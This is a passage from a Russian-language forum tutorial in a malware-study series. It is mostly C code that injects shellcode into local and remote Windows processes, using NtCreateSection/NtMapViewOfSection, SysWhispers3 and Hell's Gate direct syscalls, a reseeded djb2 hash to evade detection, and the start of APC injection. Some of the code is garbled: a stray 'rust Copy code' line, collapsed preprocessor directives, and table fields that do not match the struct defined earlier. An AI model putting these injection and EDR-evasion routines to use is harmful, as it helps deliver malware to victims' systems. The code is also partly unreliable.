<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>python syswhispers.py -a x64 -c msvc -m jumper_randomized -f NtCreateSection,NtMapViewOfSection,NtUnmapViewOfSection,NtClose,NtCreateThreadEx -o SysWhispers -v*</code></pre>
	</div>
</div><br />
Генерируются три файла: SysWhispers.h, SysWhispers.c и SysWhispers-asm.x64.asm.<br />
<br />
Следующим шагом является импорт этих файлов в Visual Studio, как показано было выше.<br />
<br />
Ниже приведены функции LocalMappingInjectionViaSyscalls и RemoteMappingInjectionViaSyscalls.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL LocalMappingInjectionViaSyscalls(IN PVOID pPayload, IN SIZE_T sPayloadSize) {

    HANDLE                hSection        = NULL;
    HANDLE                hThread            = NULL;
    PVOID                pAddress        = NULL;
    NTSTATUS            STATUS            = NULL;
    SIZE_T                sViewSize        = NULL;
    LARGE_INTEGER        MaximumSize        = {
            .HighPart = 0,
            .LowPart = sPayloadSize
    };

//--------------------------------------------------------------------------
    // Выделение локального представления

    if ((STATUS = NtCreateSection(&amp;hSection, SECTION_ALL_ACCESS, NULL, &amp;MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != 0) {
        printf(&quot;[!] NtCreateSection завершилась с ошибкой: 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    if ((STATUS = NtMapViewOfSection(hSection, (HANDLE)-1, &amp;pAddress, NULL, NULL, NULL, &amp;sViewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)) != 0) {
        printf(&quot;[!] NtMapViewOfSection завершилась с ошибкой: 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }
    printf(&quot;[+] Выделен адрес: 0x%p размером: %d \n&quot;, pAddress, sViewSize);

//--------------------------------------------------------------------------

    // Запись полезной нагрузки
    printf(&quot;[#] Нажмите &lt;Enter&gt;, чтобы записать полезную нагрузку ... &quot;);
    getchar();
    memcpy(pAddress, pPayload, sPayloadSize);
    printf(&quot;\t[+] Полезная нагрузка скопирована с 0x%p по 0x%p \n&quot;, pPayload, pAddress);

//--------------------------------------------------------------------------

    // Выполнение полезной нагрузки через создание потока

    printf(&quot;[#] Нажмите &lt;Enter&gt;, чтобы запустить полезную нагрузку ... &quot;);
    getchar();
    printf(&quot;\t[i] Запуск потока с точки входа 0x%p ... &quot;, pAddress);
    if ((STATUS = NtCreateThreadEx(&amp;hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, pAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
        printf(&quot;[!] NtCreateThreadEx завершилась с ошибкой: 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }
    printf(&quot;[+] ГОТОВО \n&quot;);
    printf(&quot;\t[+] Поток создан с ID : %d \n&quot;, GetThreadId(hThread));

//--------------------------------------------------------------------------

    // Отмена отображения локального представления - только после завершения выполнения полезной нагрузки
    if ((STATUS = NtUnmapViewOfSection((HANDLE)-1, pAddress)) != 0) {
        printf(&quot;[!] NtUnmapViewOfSection завершилась с ошибкой: 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    // Закрытие дескриптора раздела
    if ((STATUS = NtClose(hSection)) != 0) {
        printf(&quot;[!] NtClose завершилась с ошибкой: 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    return TRUE;
}</code></pre>
	</div>
</div><br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN SIZE_T sPayloadSize) {

    HANDLE                hSection            = NULL;
    HANDLE                hThread                = NULL;
    PVOID                pLocalAddress        = NULL,
                        pRemoteAddress        = NULL;
    NTSTATUS            STATUS                = NULL;
    SIZE_T                sViewSize            = NULL;
    LARGE_INTEGER        MaximumSize         = {
            .HighPart = 0,
            .LowPart = sPayloadSize
    };

//--------------------------------------------------------------------------
    // Выделение локального представления

    if ((STATUS = NtCreateSection(&amp;hSection, SECTION_ALL_ACCESS, NULL, &amp;MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != 0) {
        printf(&quot;[!] NtCreateSection завершилась с ошибкой: 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    if ((STATUS = NtMapViewOfSection(hSection, (HANDLE)-1, &amp;pLocalAddress, NULL, NULL, NULL, &amp;sViewSize, ViewShare, NULL, PAGE_READWRITE)) != 0) {
        printf(&quot;[!] NtMapViewOfSection [L] завершилась с ошибкой: 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    printf(&quot;[+] Локальная память выделена по адресу: 0x%p размером: %d \n&quot;, pLocalAddress, sViewSize);

//--------------------------------------------------------------------------

    // Запись полезной нагрузки
    printf(&quot;[#] Нажмите &lt;Enter&gt;, чтобы записать полезную нагрузку ... &quot;);
    getchar();
    memcpy(pLocalAddress, pPayload, sPayloadSize);
    printf(&quot;\t[+] Полезная нагрузка скопирована с 0x%p по 0x%p \n&quot;, pPayload, pLocalAddress);

//--------------------------------------------------------------------------

    // Выделение удаленного представления
    if ((STATUS = NtMapViewOfSection(hSection, hProcess, &amp;pRemoteAddress, NULL, NULL, NULL, &amp;sViewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)) != 0) {
        printf(&quot;[!] NtMapViewOfSection [R] завершилась с ошибкой: 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    printf(&quot;[+] Удаленная память выделена по адресу: 0x%p размером: %d \n&quot;, pRemoteAddress, sViewSize);

//--------------------------------------------------------------------------

    // Выполнение полезной нагрузки через создание потока
    printf(&quot;[#] Нажмите &lt;Enter&gt;, чтобы запустить полезную нагрузку ... &quot;);
    getchar();
    printf(&quot;\t[i] Запуск потока с точки входа 0x%p ... &quot;, pRemoteAddress);
    if ((STATUS = NtCreateThreadEx(&amp;hThread, THREAD_ALL_ACCESS, NULL, hProcess, pRemoteAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
        printf(&quot;[!] NtCreateThreadEx завершилась с ошибкой: 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }
    printf(&quot;[+] ГОТОВО \n&quot;);
    printf(&quot;\t[+] Поток создан с ID : %d \n&quot;, GetThreadId(hThread));

//--------------------------------------------------------------------------

    // Отмена отображения локального представления - только после завершения выполнения полезной нагрузки
    if ((STATUS = NtUnmapViewOfSection((HANDLE)-1, pLocalAddress)) != 0) {
        printf(&quot;[!] NtUnmapViewOfSection завершилась с ошибкой: 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    // Закрытие дескриптора раздела
    if ((STATUS = NtClose(hSection)) != 0) {
        printf(&quot;[!] NtClose завершилась с ошибкой: 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>Реализация с использованием Hell&#039;s Gate</b><br />
<br />
Последняя реализация для этого модуля использует Hell&#039;s Gate. Во-первых, убедитесь, что выполняются те же шаги, что и для настройки проекта Visual Studio с SysWhispers3.<br />
В частности, включение MASM и изменение свойств для установки файла ASM для компиляции с использованием Microsoft Macro Assembler.<br />
<br />
<b>Обновление структуры VX_TABLE</b><br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct _VX_TABLE {
    VX_TABLE_ENTRY NtCreateSection;
    VX_TABLE_ENTRY NtMapViewOfSection;
    VX_TABLE_ENTRY NtUnmapViewOfSection;
    VX_TABLE_ENTRY NtClose;
    VX_TABLE_ENTRY NtCreateThreadEx;
} VX_TABLE, * PVX_TABLE;</code></pre>
	</div>
</div><br />
<b>Обновление значения Seed Value</b><br />
<br />
Новое значение семени будет использоваться <a href="https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c#L93" target="_blank" class="link link--external" rel="noopener">вместо старого</a>, чтобы изменить хэш-значения системных вызовов. Функция хеширования djb2 обновляется с новым значением <b>Seed Value</b>, приведенным ниже:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>DWORD64 djb2(PBYTE str) {
    DWORD64 dwHash = 0x77347734DEADBEEF; // Старое значение: 0x7734773477347734
    INT c;

    while (c = *str++)
        dwHash = ((dwHash &lt;&lt; 0x5) + dwHash) + c;

    return dwHash;
}</code></pre>
	</div>
</div><br />
Теперь необходимо сгенерировать хэш-значений djb2 для функций (Напишите консольную программу например):<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>printf(&quot;#define %s%s 0x%p \n&quot;, &quot;NtCreateSection&quot;, &quot;_djb2&quot;, (DWORD64)djb2(&quot;NtCreateSection&quot;));
printf(&quot;#define %s%s 0x%p \n&quot;, &quot;NtMapViewOfSection&quot;, &quot;_djb2&quot;, djb2(&quot;NtMapViewOfSection&quot;));
printf(&quot;#define %s%s 0x%p \n&quot;, &quot;NtUnmapViewOfSection&quot;, &quot;_djb2&quot;, djb2(&quot;NtUnmapViewOfSection&quot;));
printf(&quot;#define %s%s 0x%p \n&quot;, &quot;NtClose&quot;, &quot;_djb2&quot;, djb2(&quot;NtClose&quot;));
printf(&quot;#define %s%s 0x%p \n&quot;, &quot;NtCreateThreadEx&quot;, &quot;_djb2&quot;, djb2(&quot;NtCreateThreadEx&quot;));</code></pre>
	</div>
</div><br />
Как только значения сгенерированы, добавьте их в начало проекта Hell&#039;s Gate:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#define NtCreateSection_djb2         0x5687F81AC5D1497A
#define NtMapViewOfSection_djb2      0x0778E82F702E79D4
#define NtUnmapViewOfSection_djb2    0x0BF2A46A27B93797
#define NtClose_djb2                 0x0DA4FA80EF5031E7
#define NtCreateThreadEx_djb2        0x2786FB7E75145F1A</code></pre>
	</div>
</div><br />
<b>Функции LocalMappingInjectionViaSyscalls и RemoteMappingInjectionViaSyscalls</b><br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL LocalMappingInjectionViaSyscalls(IN PVX_TABLE pVxTable, IN PVOID pPayload, IN SIZE_T sPayloadSize) {

    HANDLE                hSection        = NULL;
    HANDLE                hThread            = NULL;
    PVOID                pAddress        = NULL;
    NTSTATUS            STATUS            = NULL;
    SIZE_T                sViewSize        = NULL;
    LARGE_INTEGER        MaximumSize     = {
            .HighPart = 0,
            .LowPart = sPayloadSize
    };

//--------------------------------------------------------------------------
    // Выделение локального представления
    HellsGate(pVxTable-&gt;NtCreateSection.wSystemCall);
    if ((STATUS = HellDescent(&amp;hSection, SECTION_ALL_ACCESS, NULL, &amp;MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != 0) {
        printf(&quot;[!] NtCreateSection завершилась с ошибкой: 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    HellsGate(pVxTable-&gt;NtMapViewOfSection.wSystemCall);
    if ((STATUS = HellDescent(hSection, (HANDLE)-1, &amp;pAddress, NULL, NULL, NULL, &amp;sViewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)) != 0) {
        printf(&quot;[!] NtMapViewOfSection завершилась с ошибкой: 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }
    printf(&quot;[+] Выделен адрес: 0x%p размером: %ld \n&quot;, pAddress, sViewSize);

//--------------------------------------------------------------------------
    // Запись полезной нагрузки
    printf(&quot;[#] Нажмите &lt;Enter&gt;, чтобы записать полезную нагрузку ... &quot;);
    getchar();
    memcpy(pAddress, pPayload, sPayloadSize);
    printf(&quot;\t[+] Полезная нагрузка скопирована с 0x%p по 0x%p \n&quot;, pPayload, pAddress);
    printf(&quot;[#] Нажмите &lt;Enter&gt;, чтобы запустить полезную нагрузку ... &quot;);
    getchar();

//--------------------------------------------------------------------------

    // Выполнение полезной нагрузки через создание потока
    printf(&quot;\t[i] Запуск потока с точки входа 0x%p ... &quot;, pAddress);
    HellsGate(pVxTable-&gt;NtCreateThreadEx.wSystemCall);
    if ((STATUS = HellDescent(&amp;hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, pAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
        printf(&quot;[!] NtCreateThreadEx завершилась с ошибкой: 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }
    printf(&quot;[+] ГОТОВО \n&quot;);
    printf(&quot;\t[+] Поток создан с ID : %d \n&quot;, GetThreadId(hThread));

//--------------------------------------------------------------------------

    // Отмена отображения локального представления - только после завершения выполнения полезной нагрузки
    HellsGate(pVxTable-&gt;NtUnmapViewOfSection.wSystemCall);
    if ((STATUS = HellDescent((HANDLE)-1, pAddress)) != 0) {
        printf(&quot;[!] NtUnmapViewOfSection завершилась с ошибкой: 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    // Закрытие дескриптора раздела
    HellsGate(pVxTable-&gt;NtClose.wSystemCall);
    if ((STATUS = HellDescent(hSection)) != 0) {
        printf(&quot;[!] NtClose завершилась с ошибкой: 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    return TRUE;
}</code></pre>
	</div>
</div><br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL RemoteMappingInjectionViaSyscalls(IN PVX_TABLE pVxTable, IN HANDLE hProcess, IN PVOID pPayload, IN SIZE_T sPayloadSize) {

    HANDLE                hSection            = NULL;
    HANDLE                hThread                = NULL;
    PVOID                pLocalAddress        = NULL,
                        pRemoteAddress        = NULL;
    NTSTATUS            STATUS                = NULL;
    SIZE_T                sViewSize            = NULL;
    LARGE_INTEGER        MaximumSize         = {
            .HighPart = 0,
            .LowPart = sPayloadSize
    };

//--------------------------------------------------------------------------
    // Выделение локального представления

    HellsGate(pVxTable-&gt;NtCreateSection.wSystemCall);
    if ((STATUS = HellDescent(&amp;hSection, SECTION_ALL_ACCESS, NULL, &amp;MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != 0) {
        printf(&quot;[!] NtCreateSection завершилась с ошибкой: 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    HellsGate(pVxTable-&gt;NtMapViewOfSection.wSystemCall);
    if ((STATUS = HellDescent(hSection, (HANDLE)-1, &amp;pLocalAddress, NULL, NULL, NULL, &amp;sViewSize, ViewShare, NULL, PAGE_READWRITE)) != 0) {
        printf(&quot;[!] NtMapViewOfSection [L] завершилась с ошибкой: 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    printf(&quot;[+] Локальная память выделена по адресу: 0x%p размером: %d \n&quot;, pLocalAddress, sViewSize);

//--------------------------------------------------------------------------

    // Запись полезной нагрузки
    printf(&quot;[#] Нажмите &lt;Enter&gt;, чтобы записать полезную нагрузку ... &quot;);
    getchar();
    memcpy(pLocalAddress, pPayload, sPayloadSize);
    printf(&quot;\t[+] Полезная нагрузка скопирована с 0x%p по 0x%p \n&quot;, pPayload, pLocalAddress);

//--------------------------------------------------------------------------

    // Выделение удаленного представления
    HellsGate(pVxTable-&gt;NtMapViewOfSection.wSystemCall);
    if ((STATUS = HellDescent(hSection, hProcess, &amp;pRemoteAddress, NULL, NULL, NULL, &amp;sViewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)) != 0) {
        printf(&quot;[!] NtMapViewOfSection [R] завершилась с ошибкой: 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    printf(&quot;[+] Удаленная память выделена по адресу: 0x%p размером: %d \n&quot;, pRemoteAddress, sViewSize);

//--------------------------------------------------------------------------

    // Выполнение полезной нагрузки через создание потока
    printf(&quot;[#] Нажмите &lt;Enter&gt;, чтобы запустить полезную нагрузку ... &quot;);
    getchar();
    printf(&quot;\t[i] Запуск потока с точки входа 0x%p ... &quot;, pRemoteAddress);
    HellsGate(pVxTable-&gt;NtCreateThreadEx.wSystemCall);
    if ((STATUS = HellDescent(&amp;hThread, THREAD_ALL_ACCESS, NULL, hProcess, pRemoteAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
        printf(&quot;[!] NtCreateThreadEx завершилась с ошибкой: 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }
    printf(&quot;[+] ГОТОВО \n&quot;);
    printf(&quot;\t[+] Поток создан с ID: %d \n&quot;, GetThreadId(hThread));

//--------------------------------------------------------------------------

    // Отмена отображения локального представления - только после завершения выполнения полезной нагрузки
    HellsGate(pVxTable-&gt;NtUnmapViewOfSection.wSystemCall);
    if ((STATUS = HellDescent((HANDLE)-1, pLocalAddress)) != 0) {
        printf(&quot;[!] NtUnmapViewOfSection завершилась с ошибкой: 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    // Закрытие дескриптора раздела
    HellsGate(pVxTable-&gt;NtClose.wSystemCall);
    if ((STATUS = HellDescent(hSection)) != 0) {
        printf(&quot;[!] NtClose завершилась с ошибкой: 0x%0.8X \n&quot;, STATUS);
        return FALSE;
    }

    return TRUE;
}</code></pre>
	</div>
</div><br />
<b>Обновление главной функции</b><br />
<br />
Главная функция должна быть обновлена, чтобы вызывать LocalMappingInjectionViaSyscalls вместо <a href="https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c#L80" target="_blank" class="link link--external" rel="noopener">payload function</a>. Функция будет использовать выше сгенерированные хэши, как показано ниже.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>INT main() {
    // Getting the PEB structure
    PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
    PPEB pCurrentPeb = pCurrentTeb-&gt;ProcessEnvironmentBlock;
    if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb-&gt;OSMajorVersion != 0xA)
        return 0x1;

    // Getting the NTDLL module
    PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb-&gt;LoaderData-&gt;InMemoryOrderModuleList.Flink-&gt;Flink - 0x10);

    // Getting the EAT of Ntdll
    PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
    if (!GetImageExportDirectory(pLdrDataEntry-&gt;DllBase, &amp;pImageExportDirectory) || pImageExportDirectory == NULL)
        return 0x01;

//--------------------------------------------------------------------------
    // Initializing the &#039;Table&#039; structure
    VX_TABLE Table = { 0 };
    Table.NtAllocateVirtualMemory.dwHash = NtAllocateVirtualMemory_djb2;
    if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;Table.NtAllocateVirtualMemory))
        return 0x1;

    Table.NtWriteVirtualMemory.dwHash = NtWriteVirtualMemory_djb2;
    if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;Table.NtWriteVirtualMemory))
        return 0x1;

    Table.NtProtectVirtualMemory.dwHash = NtProtectVirtualMemory_djb2;
    if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;Table.NtProtectVirtualMemory))
        return 0x1;

    Table.NtCreateThreadEx.dwHash = NtCreateThreadEx_djb2;
    if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;Table.NtCreateThreadEx))
        return 0x1;

//--------------------------------------------------------------------------
    // injection code - calling the &#039;ClassicInjectionViaSyscalls&#039; function


// If local injection
#ifdef LOCAL_INJECTION if (!LocalMappingInjectionViaSyscalls(&amp;Table, (HANDLE)-1, Payload, sizeof(Payload)))
        return 0x1;
#endif // LOCAL_INJECTION// If remote injection
#ifdef REMOTE_INJECTION// Open a handle to the target process
    printf(&quot;[i] Targeting process of id : %d \n&quot;, PROCESS_ID);
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PROCESS_ID);
    if (hProcess == NULL) {
        printf(&quot;[!] OpenProcess Failed With Error : %d \n&quot;, GetLastError());
        return -1;
    }

    if (!RemoteMappingInjectionViaSyscalls(&amp;Table, hProcess, Payload, sizeof(Payload)))
        return 0x1;

#endif // REMOTE_INJECTIONreturn 0x00;
}</code></pre>
	</div>
</div><br />
<b>Локальная vs удаленная инъекция</b><br />
<br />
Аналогично предыдущему модулю, был создан макрос-препроцессорный код для целей локального процесса, если LOCAL_INJECTION определено. Пример препроцессорного кода приведен ниже:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>#define LOCAL_INJECTION#ifndef LOCAL_INJECTION#define REMOTE_INJECTION// Установите PID целевого процесса
#define PROCESS_ID    18784    #endif // !LOCAL_INJECTION</code></pre>
	</div>
</div><br />
<b>Давайте теперь перепишем технику Изучаем технику APC Injection | Цикл статей &quot;Изучение вредоносных программ&quot;</b><br />
<br />
Этот модуль реализует технику инъекции APC с использованием прямых системных вызовов, заменяя WinAPI на их эквиваленты с использованием системных вызовов. Выделение памяти и запись полезной нагрузки будут выполняться с использованием функций NtAllocateVirtualMemory, NtProtectVirtualMemory и NtWriteVirtualMemory, которые уже обсуждались в реализации классической инъекции. Оставшийся системный вызов, который будет объяснен, - это NtQueueApcThread.<br />
<br />
QueueUserAPC заменен на NtQueueApcThread.<br />
<br />
<b>NtQueueApcThread<br />
<br />
Этот системный вызов является результатом QueueUserAPC WinAPI. Nиже приведен пример NtQueueApcThread.</b><br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>NTSTATUS NtQueueApcThread(
IN HANDLE ThreadHandle, // Дескриптор потока для выполнения указанной APC
IN PIO_APC_ROUTINE ApcRoutine, // Указатель на предоставленную пользователем функцию APC для выполнения
IN PVOID ApcRoutineContext OPTIONAL, // Указатель на параметр (1) для APC (установлен в NULL)
IN PIO_STATUS_BLOCK ApcStatusBlock OPTIONAL, // Указатель на параметр (2) для APC (установлен в NULL)
IN ULONG ApcReserved OPTIONAL // Указатель на параметр (3) для APC (установлен в NULL)
);</code></pre>
	</div>
</div><br />
Первые два параметра тривиальны для понимания. Оставшиеся три - ApcRoutineContext, ApcStatusBlock и ApcReserved, используются в качестве параметров для функции APC, ApcRoutine.<br />
<br />
<b>Создание потока, поддерживающего сигналы</b><br />
<br />
Поскольку техника инъекции APC требует наличия потока в состоянии, поддерживающем сигналы, это обеспечивается с использованием функции CreateThread WinAPI.<br />
<br />
Функция AlterableFunction будет вызываться жертвенным потоком.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>VOID AlterableFunction() {

HANDLE hEvent = CreateEvent(NULL, NULL, NULL, NULL);

MsgWaitForMultipleObjectsEx(
1,
&amp;hEvent,
INFINITE,
QS_HOTKEY,
MWMO_ALERTABLE
);

}</code></pre>
	</div>
</div><br />
<b>Реализация с использованием GetProcAddress и GetModuleHandle </b><br />
<br />
Создается и инициализируется структура Syscall с помощью функции InitializeSyscallStruct, которая содержит адреса используемых системных вызовов, как показано ниже.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct _Syscall {

fnNtAllocateVirtualMemory pNtAllocateVirtualMemory;
fnNtProtectVirtualMemory  pNtProtectVirtualMemory;
fnNtWriteVirtualMemory    pNtWriteVirtualMemory;
fnNtQueueApcThread        pNtQueueApcThread;
} Syscall, * PSyscall;</code></pre>
	</div>
</div><br />
<b>Функция для заполнения структуры &#039;St&#039;</b><br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL InitializeSyscallStruct(OUT PSyscall St) {

rust
Copy code
HMODULE hNtdll =  GetModuleHandle(L&quot;NTDLL.DLL&quot;);
if (!hNtdll) {
    printf(&quot;[!] GetModuleHandle Failed With Error : %d \n&quot;, GetLastError());
    return FALSE;
}

St-&gt;pNtAllocateVirtualMemory  = (fnNtAllocateVirtualMemory)GetProcAddress(hNtdll, &quot;NtAllocateVirtualMemory&quot;);
St-&gt;pNtProtectVirtualMemory   = (fnNtProtectVirtualMemory)GetProcAddress(hNtdll, &quot;NtProtectVirtualMemory&quot;);
St-&gt;pNtWriteVirtualMemory     = (fnNtWriteVirtualMemory)GetProcAddress(hNtdll, &quot;NtWriteVirtualMemory&quot;);
St-&gt;pNtQueueApcThread         = (fnNtQueueApcThread)GetProcAddress(hNtdll, &quot;NtQueueApcThread&quot;);

// Проверка, что GetProcAddress не пропустил системный вызов
if (St-&gt;pNtAllocateVirtualMemory == NULL || St-&gt;pNtProtectVirtualMemory == NULL || St-&gt;pNtWriteVirtualMemory == NULL || St-&gt;pNtQueueApcThread == NULL)
    return FALSE;
else
    return TRUE;
}</code></pre>
	</div>
</div><br />
Далее функция ApcInjectionViaSyscalls будет отвечать за выделение, запись и выполнение полезной нагрузки pPayload в целевом процессе hProcess. Она будет использовать дескриптор жертвенного потока hThread. Функция возвращает FALSE, если не удается выполнить полезную нагрузку, и TRUE, если выполнение прошло успешно.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL ApcInjectionViaSyscalls(IN HANDLE hProcess, IN HANDLE hThread, IN PVOID pPayload, IN SIZE_T sPayloadSize) {

Syscall     St                      = { 0 };
NTSTATUS    STATUS                  = NULL;
PVOID       pAddress                = NULL;
ULONG       uOldProtection          = NULL;
SIZE_T      sSize                   = sPayloadSize,
            sNumberOfBytesWritten   = NULL;

// Инициализация структуры &#039;St&#039; для получения адресов системных вызовов
if (!InitializeSyscallStruct(&amp;St)) {
    printf(&quot;[!] Could Not Initialize The Syscall Struct \n&quot;);
    return FALSE;
}

// Выделение памяти
if ((STATUS = St.pNtAllocateVirtualMemory(hProcess, &amp;pAddress, 0, &amp;sSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) != 0) {
    printf(&quot;[!] NtAllocateVirtualMemory Failed With Error : 0x%0.8X \n&quot;, STATUS);
    return FALSE;
}
printf(&quot;[+] Allocated Address At : 0x%p Of Size : %d \n&quot;, pAddress, sSize);
